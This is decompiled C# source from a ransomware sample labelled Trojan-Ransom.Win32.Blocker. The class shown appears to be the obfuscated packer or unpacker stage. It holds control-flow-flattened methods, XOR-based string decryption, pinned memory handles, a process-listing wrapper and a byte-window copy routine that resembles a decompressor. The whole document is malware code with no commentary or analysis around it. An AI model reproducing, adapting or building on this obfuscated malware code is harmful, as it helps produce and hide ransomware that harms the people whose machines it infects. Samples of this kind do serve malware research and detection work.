// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server.packed, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 712FD340-1A8D-4ADA-8620-0D072E5BB482
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bipa-183abe361833d2ddb4e38325acbbb19715b5270dec52a0eb9bb6b99cfb8f1470.exe

using \u0004;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;

public sealed class \u000E
{
  private \u0005\u2000.ႳႰ Ⴍ;
  private static readonly char[] Ⴜ;
  private static readonly char[] ႤႭ;
  private static readonly string[] ႤႤ;
  internal static \u000E.ႤႠ ႤႰ;

  public unsafe void \u0002([In] uint obj0)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(12);
    if (true)
    {
      int num1 = 6;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            this.Ⴍ.\u0001 = new byte[(IntPtr) obj0];
            num2 = 4;
            goto label_6;
          case 2:
            goto label_5;
          case 3:
            goto label_9;
          case 4:
            *(int*) voidPtr = (int) obj0;
            this.Ⴍ.\u0002 = *(uint*) voidPtr;
            if (true)
            {
              *(int*) ((IntPtr) voidPtr + 4) = 0;
              this.Ⴍ.\u0001 = *(uint*) ((IntPtr) voidPtr + 4);
              num1 = 3;
              continue;
            }
            break;
          default:
            if ((int) this.Ⴍ.\u0002 != (int) obj0)
            {
              num3 = 0;
              goto label_13;
            }
            else
              break;
        }
        num3 = 4;
        if (num3 == 0)
          num2 = num3;
        else
          goto label_13;
label_6:
        num1 = num2;
        continue;
label_13:
        num1 = num3;
      }
label_5:
      return;
label_9:
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      this.Ⴍ.\u0003 = *(uint*) ((IntPtr) voidPtr + 8);
    }
    else
    {
      // ISSUE: method reference
      RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.\u0002);
    }
  }

  public unsafe void \u0002([In] Stream obj0, [In] bool obj1)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(8);
    int num = 3;
    while (true)
    {
      switch (num)
      {
        case 0:
          *(int*) voidPtr = 0;
          this.Ⴍ.\u0003 = *(uint*) voidPtr;
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          this.Ⴍ.\u0001 = *(uint*) ((IntPtr) voidPtr + 4);
          num = 5;
          continue;
        case 2:
          goto label_2;
        case 4:
          this.Ⴍ.\u0001 = obj0;
          num = obj1 ? 5 : 0;
          continue;
        case 5:
          goto label_1;
        default:
          this.\u0002();
          goto case 4;
      }
    }
label_2:
    return;
label_1:;
  }

  public void \u0002([In] Stream obj0) => this.\u0002(obj0, false);

  public void \u0002()
  {
label_0:
    if (true)
      goto label_5;
label_3:
    if (true)
    {
      if (true)
        return;
      goto label_6;
    }
    else
      goto label_0;
label_5:
    this.\u0003();
label_6:
    if (true)
      goto label_7;
label_2:
    Stream stream;
    this.Ⴍ.\u0001 = stream;
    goto label_3;
label_7:
    stream = (Stream) null;
    goto label_2;
  }

  public unsafe void \u0003()
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(16);
    *(int*) ((IntPtr) voidPtr + 12) = 5;
    while (true)
    {
      switch (*(int*) ((IntPtr) voidPtr + 12))
      {
        case 0:
          goto label_8;
        case 2:
          *(int*) ((IntPtr) voidPtr + 12) = 3;
          continue;
        case 3:
          if (*(uint*) voidPtr == 0U)
          {
            *(int*) ((IntPtr) voidPtr + 12) = 4;
            continue;
          }
          goto label_5;
        case 4:
          goto label_1;
        default:
          *(int*) voidPtr = (int) this.Ⴍ.\u0001 - (int) this.Ⴍ.\u0003;
          goto case 2;
      }
    }
label_8:
    return;
label_1:
    return;
label_5:
    \u0003\u2002.\u0001(this.Ⴍ.\u0001, this.Ⴍ.\u0001, (int) this.Ⴍ.\u0003, (int) *(uint*) voidPtr, 377, 329);
label_6:
    if (true)
      goto label_7;
label_3:
    int num;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          goto label_6;
        case 2:
          goto label_2;
        case 4:
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          this.Ⴍ.\u0001 = *(uint*) ((IntPtr) voidPtr + 4);
          num = 5;
          continue;
        case 5:
          goto label_11;
        case 6:
          goto label_5;
        case 7:
          num = this.Ⴍ.\u0001 < this.Ⴍ.\u0002 ? 5 : 4;
          continue;
        default:
          goto label_4;
      }
    }
label_2:
    return;
label_4:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.\u0003);
    return;
label_11:
    *(int*) ((IntPtr) voidPtr + 8) = (int) this.Ⴍ.\u0001;
    this.Ⴍ.\u0003 = *(uint*) ((IntPtr) voidPtr + 8);
    return;
label_7:
    num = 7;
    goto label_3;
  }

  public void \u0002([In] uint obj0, [In] uint obj1)
  {
    int num1 = 4;
    while (true)
    {
      uint num2;
      int num3;
      do
      {
        do
        {
          switch (num1)
          {
            case 0:
            case 10:
              goto label_18;
            case 1:
              num3 = (int) obj1;
              if (false)
                break;
              goto label_21;
            case 2:
              goto label_12;
            case 3:
              byte[] numArray = this.Ⴍ.\u0001;
              \u000E obj = this;
              uint num4;
              obj.Ⴍ.\u0001 = (num4 = obj.Ⴍ.\u0001) + 1U;
              uint index = num4;
              int num5 = (int) this.Ⴍ.\u0001[(IntPtr) num2++];
              numArray[(IntPtr) index] = (byte) num5;
              goto label_14;
            case 5:
              goto label_17;
            case 6:
            case 8:
              num3 = 1;
              break;
            case 7:
              goto label_15;
            case 9:
              goto label_22;
            case 11:
              goto label_8;
            case 12:
              num2 += this.Ⴍ.\u0002;
              goto case 6;
            default:
              goto label_1;
          }
          num1 = num3;
          if (true)
            continue;
label_14:
          num1 = 7;
        }
        while (true);
        goto label_23;
label_1:;
      }
      while (false);
      goto label_25;
label_8:
      int num6;
      if (num2 < this.Ⴍ.\u0002)
      {
        num6 = 3;
        goto label_10;
      }
label_9:
      num6 = 2;
label_10:
      num1 = num6;
      continue;
label_12:
      num2 = 0U;
      num1 = 3;
      continue;
label_15:
      int num7 = (int) this.Ⴍ.\u0001;
label_16:
      num1 = (uint) num7 < this.Ⴍ.\u0002 ? 0 : 5;
      continue;
label_17:
      this.\u0003();
label_18:
      if (true)
      {
        --obj1;
        num1 = 1;
        continue;
      }
      goto label_9;
label_21:
      num1 = (uint) num3 > 0U ? 11 : 9;
      continue;
label_25:
      int num8 = (int) this.Ⴍ.\u0001;
      while (true)
      {
        int num9 = (int) obj0;
        num2 = (uint) (num8 - num9 - 1);
        if (num2 < this.Ⴍ.\u0002)
        {
          num7 = 1;
          if (num7 == 0)
            num8 = num7;
          else
            goto label_5;
        }
        else
          break;
      }
      num7 = 12;
      goto label_27;
label_5:
      if (num7 == 0)
        goto label_16;
label_27:
      num1 = num7;
    }
label_22:
    return;
label_23:;
  }

  public void \u0002([In] byte obj0)
  {
    int num1 = 2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          goto label_4;
        case 1:
        case 3:
        case 4:
          num1 = this.Ⴍ.\u0001 < this.Ⴍ.\u0002 ? 6 : 0;
          continue;
        case 6:
          goto label_2;
        default:
          byte[] numArray = this.Ⴍ.\u0001;
          \u000E obj = this;
          uint num2;
          obj.Ⴍ.\u0001 = (num2 = obj.Ⴍ.\u0001) + 1U;
          uint index = num2;
          int num3 = (int) obj0;
          numArray[(IntPtr) index] = (byte) num3;
          if (true)
          {
            num1 = 1;
            continue;
          }
          goto label_5;
      }
    }
label_2:
    return;
label_5:
    return;
label_4:
    this.\u0003();
  }

  public byte \u0002([In] uint obj0)
  {
label_12:
    int num1 = (int) this.Ⴍ.\u0001;
    while (true)
    {
      if (false)
        goto label_7;
      else
        goto label_13;
label_1:
      uint index;
      int num2;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num1 = (int) index;
            goto label_7;
          case 1:
            goto label_15;
          case 2:
          case 4:
          case 5:
            return this.Ⴍ.\u0001[(IntPtr) index];
          case 6:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.\u0002);
            if (true)
            {
              num2 = 6;
              continue;
            }
            continue;
        }
      }
      goto label_9;
label_7:
      int num3 = (int) this.Ⴍ.\u0002;
      int num4 = num1 + num3;
      if (false)
      {
        num1 = num4;
        continue;
      }
      index = (uint) num4;
label_9:
      num2 = 2;
      goto label_1;
label_13:
      int num5 = (int) obj0;
      int num6 = num1 - num5;
      int num7;
      if (true)
      {
        int num8 = num6 - 1;
        if (true)
          index = (uint) num8;
      }
      else
      {
        num7 = num6;
        goto label_16;
      }
label_15:
      num7 = (int) index;
label_16:
      int num9 = (int) this.Ⴍ.\u0002;
      num2 = (uint) num7 < (uint) num9 ? 2 : 0;
      goto label_1;
    }
  }

  static \u000E()
  {
    int length = 8;
    if (length != 0)
    {
      char[] chArray = new char[length];
      // ISSUE: field reference
      RuntimeHelpers.InitializeArray((Array) chArray, __fieldref (\u000E.ႤႰ));
      \u000E.ႤႭ = chArray;
      length = 8;
    }
    char[] chArray1 = new char[length];
    chArray1[1] = '㼔';
    chArray1[0] = '⠫';
    do
    {
      chArray1[7] = 'ⱱ';
      if (true)
      {
        chArray1[3] = 'ੂ';
        chArray1[4] = '⣛';
      }
      chArray1[6] = '⠗';
      chArray1[5] = '៓';
      chArray1[2] = '\u1C88';
      \u000E.ႤႤ = new string[1];
    }
    while (false);
    \u000E.Ⴜ = chArray1;
    \u0001.\u0001();
  }

  internal static GCHandle Ⴄ([In] object obj0, [In] GCHandleType obj1, [In] int obj2, [In] int obj3)
  {
label_11:
    int num1 = obj3;
    if (true)
      goto label_12;
label_1:
    int num2;
    switch (num1)
    {
      case 0:
        goto label_11;
      case 1:
        num2 = 0;
        goto label_10;
      case 4:
      case 7:
        return GCHandle.Alloc(obj0, obj1);
      case 6:
        if (true)
        {
          num2 = 0;
          if (true)
          {
            if (false)
              goto label_4;
            else
              goto label_10;
          }
          else
            goto label_5;
        }
        else
          goto case 4;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴄ);
        break;
    }
label_3:
    num2 = 0;
    goto label_10;
label_4:
    int num3 = 1;
    goto label_13;
label_5:
    num3 = 4;
    goto label_13;
label_10:
    num1 = num2;
    goto label_1;
label_12:
    int num4 = obj2;
    switch (num1 ^ num4)
    {
      case 61:
        goto label_5;
      default:
        goto label_4;
    }
label_13:
    num2 = num3;
    if (false)
      goto label_3;
    else
      goto label_10;
  }

  internal static IntPtr Ⴀ([In] ref GCHandle obj0, [In] int obj1, [In] int obj2)
  {
    if (false)
      goto label_6;
    else
      goto label_12;
label_1:
    int num1;
    int num2;
    if (true)
      num2 = num1;
    else
      goto label_8;
label_2:
    switch (num2)
    {
      case 0:
      case 2:
        return obj0.AddrOfPinnedObject();
      case 1:
      case 3:
        goto label_10;
      case 4:
        num1 = 5;
        goto label_1;
      case 5:
        goto label_12;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴀ);
        num1 = 5;
        goto label_1;
    }
label_6:
    int num3 = 4;
    goto label_14;
label_8:
    num3 = 0;
    goto label_14;
label_10:
    num1 = 5;
    goto label_1;
label_12:
    int num4 = obj2;
    if (false)
    {
      num2 = num4;
      goto label_2;
    }
    else
    {
      if (true)
        goto label_13;
label_5:
      switch (num4)
      {
        case 0:
          goto label_8;
        default:
          goto label_6;
      }
label_13:
      int num5 = obj1;
      num4 = (num4 ^ num5) - 97;
      goto label_5;
    }
label_14:
    num1 = num3;
    if (false)
      goto label_10;
    else
      goto label_1;
  }

  internal static void Ⴐ([In] ref GCHandle obj0, [In] int obj1, [In] int obj2)
  {
label_0:
    int num1 = 0;
    while (true)
    {
      int num2 = num1;
      if (true)
      {
        switch (num2)
        {
          case 1:
            goto label_10;
          case 2:
            num1 = 0;
            continue;
          case 4:
            goto label_14;
          case 5:
            goto label_9;
          default:
            if (true)
            {
              int num3 = obj2;
              int num4 = obj1;
              int num5;
              int num6;
              while (true)
              {
                num5 = num3 ^ num4;
                num6 = 38;
                if (num6 == 0)
                {
                  num4 = num6;
                  num3 = num5;
                }
                else
                  break;
              }
              switch (num5 - num6)
              {
                case 0:
                  num2 = 4;
                  break;
                default:
                  num2 = 2;
                  break;
              }
            }
            else
              goto label_0;
            break;
        }
      }
      num1 = num2;
    }
label_10:
    return;
label_9:
    return;
label_14:
    obj0.Free();
  }

  internal static int Ⴈ([In] string obj0, [In] string obj1, [In] bool obj2, [In] int obj3, [In] int obj4)
  {
label_13:
    int num1 = obj4 ^ obj3;
    while (true)
    {
      if (true)
      {
        if (true)
        {
          switch (num1 - 79)
          {
            case 0:
              num1 = 2;
              break;
            default:
              num1 = 5;
              break;
          }
        }
        else
          break;
      }
      int num2 = num1;
      int num3;
      while (true)
      {
        do
        {
          do
          {
            switch (num2)
            {
              case 0:
              case 4:
                num2 = 6;
                continue;
              case 2:
              case 7:
                goto label_8;
              case 5:
                goto label_7;
              case 6:
                goto label_13;
              default:
                goto label_1;
            }
          }
          while (true);
          goto label_7;
label_8:;
        }
        while (false);
        goto label_16;
label_1:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴈ);
        num2 = 6;
        continue;
label_7:
        num3 = 6;
        if (num3 != 0)
          num2 = num3;
        else
          break;
      }
      num1 = num3;
    }
    return num1;
label_16:
    return string.Compare(obj0, obj1, obj2);
  }

  internal static Process[] Ⴓ([In] int obj0, [In] int obj1)
  {
label_3:
    if (true)
      goto label_12;
label_1:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴓ);
    int num1;
    if (true)
      num1 = 0;
label_11:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 5:
          goto label_3;
        case 1:
        case 3:
          num1 = 0;
          continue;
        case 4:
          num1 = 0;
          continue;
        case 6:
          if (false)
            goto case 1;
          else
            goto label_14;
        default:
          goto label_1;
      }
    }
label_14:
    return Process.GetProcesses();
label_12:
    int num2 = obj1;
    int num3 = obj0;
    if (true)
    {
      int num4 = num2 ^ num3;
      num3 = 85;
      num2 = num4;
    }
    int num5;
    switch (num2 - num3)
    {
      case 0:
        num5 = 6;
        break;
      default:
        num5 = 1;
        break;
    }
    num1 = num5;
    goto label_11;
  }

  internal static void Ⴗ([In] Stream obj0, [In] int obj1, [In] int obj2)
  {
label_0:
    int num1 = 3;
    while (true)
    {
      int num2 = num1;
      if (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            goto label_14;
          case 1:
            num1 = 3;
            continue;
          case 2:
            goto label_10;
          case 4:
            goto label_9;
          default:
            if (true)
            {
              int num3 = obj2;
              int num4 = obj1;
              int num5;
              int num6;
              while (true)
              {
                num5 = num3 ^ num4;
                num6 = 73;
                if (num6 == 0)
                {
                  num4 = num6;
                  num3 = num5;
                }
                else
                  break;
              }
              switch (num5 - num6)
              {
                case 0:
                  num2 = 0;
                  break;
                default:
                  num2 = 1;
                  break;
              }
            }
            else
              goto label_0;
            break;
        }
      }
      num1 = num2;
    }
label_10:
    return;
label_9:
    return;
label_14:
    obj0.Close();
  }

  internal static AppDomain Ⴅ([In] int obj0, [In] int obj1)
  {
label_3:
    if (true)
      goto label_12;
label_1:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u000E.Ⴅ);
    int num1;
    if (true)
      num1 = 7;
label_11:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          num1 = 7;
          continue;
        case 1:
        case 5:
          num1 = 7;
          continue;
        case 3:
          if (false)
            goto case 1;
          else
            goto label_14;
        case 4:
        case 7:
          goto label_3;
        default:
          goto label_1;
      }
    }
label_14:
    return AppDomain.CurrentDomain;
label_12:
    int num2 = obj1;
    int num3 = obj0;
    if (true)
    {
      int num4 = num2 ^ num3;
      num3 = 100;
      num2 = num4;
    }
    int num5;
    switch (num2 - num3)
    {
      case 0:
        num5 = 3;
        break;
      default:
        num5 = 1;
        break;
    }
    num1 = num5;
    goto label_11;
  }

  internal static unsafe string Ⴃ([In] int obj0, [In] int obj1)
  {
    // ISSUE: untyped stack allocation
    void* voidPtr = (void*) __untypedstackalloc(20);
    *(int*) voidPtr = obj0 ^ 623033003 ^ obj1;
    char[] ⴄⴍ = \u000E.ႤႭ;
    char[] chArray1;
    if (true)
      chArray1 = ⴄⴍ;
    *(int*) ((IntPtr) voidPtr + 4) = (int) chArray1[*(int*) voidPtr];
    string[] ⴄⴄ = \u000E.ႤႤ;
    int index = *(int*) ((IntPtr) voidPtr + 4);
    string str1;
    if ((str1 = ⴄⴄ[index]) != null)
      return str1;
    *(int*) ((IntPtr) voidPtr + 8) = (int) chArray1[*(int*) voidPtr + 1];
    *(int*) ((IntPtr) voidPtr + 8) = ((int) chArray1[*(int*) voidPtr + 2] << 16) + *(int*) ((IntPtr) voidPtr + 8);
    char[] chArray2 = new char[*(int*) ((IntPtr) voidPtr + 8)];
    char[] ⴜ = \u000E.Ⴜ;
    *(int*) ((IntPtr) voidPtr + 12) = ⴜ.Length;
    *(int*) voidPtr = *(int*) voidPtr + 3;
    *(int*) ((IntPtr) voidPtr + 16) = 0;
    while (*(int*) ((IntPtr) voidPtr + 16) < *(int*) ((IntPtr) voidPtr + 8))
    {
      chArray2[*(int*) ((IntPtr) voidPtr + 16)] = (char) ((uint) chArray1[*(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 16)] ^ (uint) ⴜ[(*(int*) ((IntPtr) voidPtr + 16) + *(int*) ((IntPtr) voidPtr + 4)) % *(int*) ((IntPtr) voidPtr + 12)]);
      *(int*) ((IntPtr) voidPtr + 16) = 1 + *(int*) ((IntPtr) voidPtr + 16);
    }
    string str2 = new string(chArray2);
    \u000E.ႤႤ[*(int*) ((IntPtr) voidPtr + 4)] = str2;
    return str2;
  }

  internal static Evidence ႤႨ([In] Assembly obj0, [In] int obj1, [In] int obj2)
  {
    do
    {
      int num1 = obj2 ^ obj1;
      int num2;
      while (true)
      {
        num2 = num1 - 6;
        if (false)
          num1 = num2;
        else
          break;
      }
      switch (num2)
      {
        case 0:
          continue;
        default:
          continue;
      }
    }
    while (false);
    return obj0.Evidence;
  }

  [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
  private struct ႤႠ
  {
  }
}
